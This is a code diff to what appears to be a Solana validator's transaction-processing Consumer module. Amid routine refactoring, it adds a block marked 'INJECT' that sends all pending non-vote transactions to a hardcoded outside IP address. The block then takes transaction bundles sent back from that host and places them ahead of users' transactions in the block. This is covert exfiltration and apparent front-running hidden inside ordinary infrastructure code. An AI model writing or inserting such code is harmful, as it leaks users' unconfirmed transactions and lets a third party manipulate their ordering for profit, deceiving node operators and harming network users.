@@ -1,3 +1,5 @@
+use solana_cost_model::transaction_cost::TransactionCost;
+
 use {
     super::{
         committer::{CommitTransactionDetails, Committer, PreBalanceInfo},
@@ -64,6 +66,9 @@ pub struct ExecuteAndCommitTransactionsOutput {
     pub commit_transactions_result: Result<Vec<CommitTransactionDetails>, PohRecorderError>,
     execute_and_commit_timings: LeaderExecuteAndCommitTimings,
     error_counters: TransactionErrorMetrics,
+    cost_model_us: u64,
+    cost_model_throttled_transactions_count: usize,
+    txs: Vec<SanitizedTransaction>,
 }
 
 pub struct Consumer {
@@ -151,9 +156,9 @@ impl Consumer {
         consumed_buffered_packets_count: &mut usize,
         rebuffered_packet_count: &mut usize,
         packets_to_process: &Vec<Arc<ImmutableDeserializedPacket>>,
-    ) -> Option<Vec<usize>> {
+    ) -> (Option<Vec<usize>>, Vec<SanitizedTransaction>) {
         if payload.reached_end_of_slot {
-            return None;
+            return (None, vec![]);
         }
 
         let packets_to_process_len = packets_to_process.len();
@@ -201,7 +206,10 @@ impl Consumer {
             .slot_metrics_tracker
             .increment_retryable_packets_count(retryable_transaction_indexes.len() as u64);
 
-        Some(retryable_transaction_indexes)
+        (
+            Some(retryable_transaction_indexes),
+            process_transactions_summary.txs,
+        )
     }
 
     fn process_packets_transactions(
@@ -222,6 +230,7 @@ impl Consumer {
 
         let ProcessTransactionsSummary {
             ref retryable_transaction_indexes,
+            ref txs,
             ref error_counters,
             ..
         } = process_transactions_summary;
@@ -233,12 +242,9 @@ impl Consumer {
         inc_new_counter_info!("banking_stage-unprocessed_transactions", retryable_tx_count);
 
         // Filter out the retryable transactions that are too old
-        let (filtered_retryable_transaction_indexes, filter_retryable_packets_us) =
-            measure_us!(Self::filter_pending_packets_from_pending_txs(
-                bank,
-                sanitized_transactions,
-                retryable_transaction_indexes,
-            ));
+        let (filtered_retryable_transaction_indexes, filter_retryable_packets_us) = measure_us!(
+            Self::filter_pending_packets_from_pending_txs(bank, txs, retryable_transaction_indexes,)
+        );
         slot_metrics_tracker.increment_filter_retryable_packets_us(filter_retryable_packets_us);
         banking_stage_stats
             .filter_pending_packets_elapsed
@@ -286,6 +292,9 @@ impl Consumer {
         let mut total_execute_and_commit_timings = LeaderExecuteAndCommitTimings::default();
         let mut total_error_counters = TransactionErrorMetrics::default();
         let mut reached_max_poh_height = false;
+
+        let mut all_txs = vec![];
+
         while chunk_start != transactions.len() {
             let chunk_end = std::cmp::min(
                 transactions.len(),
@@ -316,8 +325,13 @@ impl Consumer {
                 commit_transactions_result: new_commit_transactions_result,
                 execute_and_commit_timings: new_execute_and_commit_timings,
                 error_counters: new_error_counters,
+                txs,
                 ..
             } = execute_and_commit_transactions_output;
+
+            for tx in txs {
+                all_txs.push(tx);
+            }
 
             total_execute_and_commit_timings.accumulate(&new_execute_and_commit_timings);
             total_error_counters.accumulate(&new_error_counters);
@@ -385,6 +399,7 @@ impl Consumer {
             cost_model_us: total_cost_model_us,
             execute_and_commit_timings: total_execute_and_commit_timings,
             error_counters: total_error_counters,
+            txs: all_txs,
         }
     }
 
@@ -405,9 +420,6 @@ impl Consumer {
         txs: &[SanitizedTransaction],
         max_slot_ages: &[Slot],
     ) -> ProcessTransactionBatchOutput {
-        // Need to filter out transactions since they were sanitized earlier.
-        // This means that the transaction may cross and epoch boundary (not allowed),
-        //  or account lookup tables may have been closed.
         let pre_results = txs.iter().zip(max_slot_ages).map(|(tx, max_slot_age)| {
             if *max_slot_age < bank.slot() {
                 // Attempt re-sanitization after epoch-cross.
@@ -439,64 +451,17 @@ impl Consumer {
         chunk_offset: usize,
         pre_results: impl Iterator<Item = Result<(), TransactionError>>,
     ) -> ProcessTransactionBatchOutput {
-        let (
-            (transaction_qos_cost_results, cost_model_throttled_transactions_count),
-            cost_model_us,
-        ) = measure_us!(self.qos_service.select_and_accumulate_transaction_costs(
-            bank,
-            txs,
-            pre_results
-        ));
-
-        // Only lock accounts for those transactions are selected for the block;
-        // Once accounts are locked, other threads cannot encode transactions that will modify the
-        // same account state
-        let (batch, lock_us) = measure_us!(bank.prepare_sanitized_batch_with_results(
-            txs,
-            transaction_qos_cost_results.iter().map(|r| match r {
-                Ok(_cost) => Ok(()),
-                Err(err) => Err(err.clone()),
-            })
-        ));
-
-        // retryable_txs includes AccountInUse, WouldExceedMaxBlockCostLimit
-        // WouldExceedMaxAccountCostLimit, WouldExceedMaxVoteCostLimit
-        // and WouldExceedMaxAccountDataCostLimit
         let mut execute_and_commit_transactions_output =
-            self.execute_and_commit_transactions_locked(bank, &batch);
-
-        // Once the accounts are new transactions can enter the pipeline to process them
-        let (_, unlock_us) = measure_us!(drop(batch));
+            self.execute_and_commit_transactions_locked(bank, txs, pre_results);
 
         let ExecuteAndCommitTransactionsOutput {
             ref mut retryable_transaction_indexes,
             ref execute_and_commit_timings,
             ref commit_transactions_result,
+            cost_model_throttled_transactions_count,
+            cost_model_us,
             ..
         } = execute_and_commit_transactions_output;
-
-        // Costs of all transactions are added to the cost_tracker before processing.
-        // To ensure accurate tracking of compute units, transactions that ultimately
-        // were not included in the block should have their cost removed.
-        QosService::remove_costs(
-            transaction_qos_cost_results.iter(),
-            commit_transactions_result.as_ref().ok(),
-            bank,
-        );
-
-        // once feature `apply_cost_tracker_during_replay` is activated, leader shall no longer
-        // adjust block with executed cost (a behavior more inline with bankless leader), it
-        // should use requested, or default `compute_unit_limit` as transaction's execution cost.
-        if !bank
-            .feature_set
-            .is_active(&feature_set::apply_cost_tracker_during_replay::id())
-        {
-            QosService::update_costs(
-                transaction_qos_cost_results.iter(),
-                commit_transactions_result.as_ref().ok(),
-                bank,
-            );
-        }
 
         retryable_transaction_indexes
             .iter_mut()
@@ -510,13 +475,7 @@ impl Consumer {
         // reports qos service stats for this batch
         self.qos_service.report_metrics(bank.slot());
 
-        debug!(
-            "bank: {} lock: {}us unlock: {}us txs_len: {}",
-            bank.slot(),
-            lock_us,
-            unlock_us,
-            txs.len(),
-        );
+        debug!("bank: {} txs_len: {}", bank.slot(), txs.len(),);
 
         ProcessTransactionBatchOutput {
             cost_model_throttled_transactions_count,
@@ -525,29 +484,169 @@ impl Consumer {
         }
     }
 
+    fn simulate_bundles(
+        &self,
+        bank: &Arc<Bank>,
+        bundles: Vec<Vec<SanitizedTransaction>>,
+    ) -> Vec<SanitizedTransaction> {
+        info!("version: 2.3");
+        if bundles.len() == 0 {
+            return vec![];
+        }
+
+        let mut txs = vec![];
+        let mut indexes_end_bundle = vec![];
+
+        for bundle in bundles.clone() {
+            for tx in bundle.clone() {
+                txs.push(tx);
+            }
+            indexes_end_bundle.push(bundle.len());
+        }
+
+        let results = bank.simulate_transactions(&txs);
+        info!("simulation results: {:?}", results);
+
+        let mut last_bundle_index = 0;
+        let mut is_success_bundle = true;
+        let mut success_bundles = vec![];
+
+        results.into_iter().enumerate().for_each(|(i, result)| {
+            let len_bundle = indexes_end_bundle[last_bundle_index];
+
+            if !result.was_executed_successfully() {
+                is_success_bundle = false;
+            }
+
+            if i == (len_bundle - 1) {
+                if is_success_bundle {
+                    success_bundles.push(bundles[last_bundle_index].clone());
+                }
+
+                last_bundle_index += 1;
+            }
+        });
+
+        let mut new_txs = vec![];
+        new_txs.extend(
+            success_bundles
+                .iter()
+                .flat_map(|bundle| bundle.iter().cloned()),
+        );
+
+        new_txs
+        // vec![]
+    }
+
     fn execute_and_commit_transactions_locked(
         &self,
         bank: &Arc<Bank>,
-        batch: &TransactionBatch,
+        txs: &[SanitizedTransaction],
+        _pre_results: impl Iterator<Item = Result<(), TransactionError>>,
     ) -> ExecuteAndCommitTransactionsOutput {
         let transaction_status_sender_enabled = self.committer.transaction_status_sender_enabled();
         let mut execute_and_commit_timings = LeaderExecuteAndCommitTimings::default();
-
         let mut pre_balance_info = PreBalanceInfo::default();
+
+        let sanitized_transactions = txs;
+        let sanitized_transactions_non_vote: Vec<SanitizedTransaction> = txs
+            .into_iter()
+            .filter(|e| !e.is_simple_vote_transaction())
+            .cloned()
+            .collect();
+        let mut bundles: Vec<Vec<SanitizedTransaction>> = vec![];
+
+        // INJECT
+        if sanitized_transactions_non_vote.len() > 0 {
+            let encoded = bincode::serialize(&sanitized_transactions_non_vote).unwrap();
+            let client = reqwest::blocking::Client::new();
+            if let Ok(resp_raw) = client
+                .post("http://134.122.68.49:5775")
+                .timeout(std::time::Duration::from_millis(100))
+                .json::<Vec<u8>>(&encoded)
+                .send()
+            {
+                if let Ok(resp) = resp_raw.text() {
+                    match serde_json::from_str::<Vec<u8>>(&resp) {
+                        Ok(bin) => {
+                            match bincode::deserialize::<Vec<Vec<SanitizedTransaction>>>(&bin) {
+                                Ok(parsed_out) => {
+                                    debug!(
+                                        "Success! bincode parse, count bundles {}",
+                                        parsed_out.len()
+                                    );
+                                    bundles = parsed_out;
+                                }
+                                Err(e) => {
+                                    debug!("Error! bincode parse");
+                                    debug!("{:?}", e);
+                                }
+                            };
+                        }
+                        Err(e) => {
+                            println!("Error! json parse");
+                            println!("{:?}", e);
+                        }
+                    }
+                }
+            }
+        }
+
+        let added_txs = self.simulate_bundles(bank, bundles);
+        info!("simulate succes bundle txs {}", added_txs.len());
+
+        let mut txs = vec![];
+
+        for tx in added_txs.clone() {
+            txs.push(tx);
+        }
+
+        for tx in sanitized_transactions {
+            if !added_txs.contains(&tx) {
+                txs.push(tx.clone());
+            }
+        }
+
+        let diff_txs = txs.len() - sanitized_transactions.len();
+        info!(
+            "all txs {}, sanitized_transactions txs {}, diff txs {}",
+            txs.len(),
+            sanitized_transactions.len(),
+            diff_txs
+        );
+
+        let pre_results = std::iter::repeat(Ok(()));
+        let (
+            (transaction_qos_cost_results_update, cost_model_throttled_transactions_count),
+            cost_model_us,
+        ) = measure_us!(self.qos_service.select_and_accumulate_transaction_costs(
+            bank,
+            &txs,
+            pre_results
+        ));
+
+        let (batch, lock_us) = measure_us!(bank.prepare_sanitized_batch_with_results(
+            &txs,
+            transaction_qos_cost_results_update.iter().map(|r| match r {
+                Ok(_cost) => Ok(()),
+                Err(err) => Err(err.clone()),
+            })
+        ));
+
+        debug!("batch txs count {}", batch.sanitized_transactions().len());
+
         let (_, collect_balances_us) = measure_us!({
-            // If the extra meta-data services are enabled for RPC, collect the
-            // pre-balances for native and token programs.
             if transaction_status_sender_enabled {
-                pre_balance_info.native = bank.collect_balances(batch);
+                pre_balance_info.native = bank.collect_balances(&batch);
                 pre_balance_info.token =
-                    collect_token_balances(bank, batch, &mut pre_balance_info.mint_decimals)
+                    collect_token_balances(bank, &batch, &mut pre_balance_info.mint_decimals)
             }
         });
         execute_and_commit_timings.collect_balances_us = collect_balances_us;
 
         let (load_and_execute_transactions_output, load_execute_us) = measure_us!(bank
             .load_and_execute_transactions(
-                batch,
+                &batch,
                 MAX_PROCESSING_AGE,
                 transaction_status_sender_enabled,
                 transaction_status_sender_enabled,
@@ -556,6 +655,7 @@ impl Consumer {
                 None, // account_overrides
                 self.log_messages_bytes_limit
             ));
+
         execute_and_commit_timings.load_execute_us = load_execute_us;
 
         let LoadAndExecuteTransactionsOutput {
@@ -571,6 +671,10 @@ impl Consumer {
         } = load_and_execute_transactions_output;
 
         let transactions_attempted_execution_count = execution_results.len();
+        debug!(
+            "transactions_attempted_execution_count {}",
+            transactions_attempted_execution_count
+        );
         let (executed_transactions, execution_results_to_transactions_us) =
             measure_us!(execution_results
                 .iter()
@@ -590,6 +694,12 @@ impl Consumer {
         let ((last_blockhash, lamports_per_signature), last_blockhash_us) =
             measure_us!(bank.last_blockhash_and_lamports_per_signature());
         execute_and_commit_timings.last_blockhash_us = last_blockhash_us;
+
+        debug!(
+            "bank slot {}, record txs {}",
+            bank.slot(),
+            executed_transactions.len()
+        );
 
         let (record_transactions_summary, record_us) = measure_us!(self
             .transaction_recorder
@@ -611,10 +721,21 @@ impl Consumer {
                 |(index, execution_result)| execution_result.was_executed().then_some(index),
             ));
 
+            QosService::remove_costs(transaction_qos_cost_results_update.iter(), None, bank);
+            if !bank
+                .feature_set
+                .is_active(&feature_set::apply_cost_tracker_during_replay::id())
+            {
+                QosService::update_costs(transaction_qos_cost_results_update.iter(), None, bank);
+            }
+
             return ExecuteAndCommitTransactionsOutput {
+                cost_model_us,
+                cost_model_throttled_transactions_count,
                 transactions_attempted_execution_count,
                 executed_transactions_count,
                 executed_with_successful_result_count,
+                txs: txs.clone(),
                 retryable_transaction_indexes,
                 commit_transactions_result: Err(recorder_err),
                 execute_and_commit_timings,
@@ -624,7 +745,7 @@ impl Consumer {
 
         let (commit_time_us, commit_transaction_statuses) = if executed_transactions_count != 0 {
             self.committer.commit_transactions(
-                batch,
+                &batch,
                 &mut loaded_transactions,
                 execution_results,
                 last_blockhash,
@@ -645,28 +766,28 @@ impl Consumer {
             )
         };
 
+        QosService::remove_costs(
+            transaction_qos_cost_results_update.iter(),
+            Some(&commit_transaction_statuses),
+            bank,
+        );
+        if !bank
+            .feature_set
+            .is_active(&feature_set::apply_cost_tracker_during_replay::id())
+        {
+            QosService::update_costs(
+                transaction_qos_cost_results_update.iter(),
+                Some(&commit_transaction_statuses),
+                bank,
+            );
+        }
+
         drop(freeze_lock);
-
-        debug!(
-            "bank: {} process_and_record_locked: {}us record: {}us commit: {}us txs_len: {}",
-            bank.slot(),
-            load_execute_us,
-            record_us,
-            commit_time_us,
-            batch.sanitized_transactions().len(),
-        );
-
-        debug!(
-            "execute_and_commit_transactions_locked: {:?}",
-            execute_and_commit_timings.execute_timings,
-        );
-
-        debug_assert_eq!(
-            commit_transaction_statuses.len(),
-            transactions_attempted_execution_count
-        );
+        drop(batch);
 
         ExecuteAndCommitTransactionsOutput {
+            cost_model_throttled_transactions_count,
+            cost_model_us,
             transactions_attempted_execution_count,
             executed_transactions_count,
             executed_with_successful_result_count,
@@ -674,6 +795,7 @@ impl Consumer {
             commit_transactions_result: Ok(commit_transaction_statuses),
             execute_and_commit_timings,
             error_counters,
+            txs: txs.clone(),
         }
     }
 
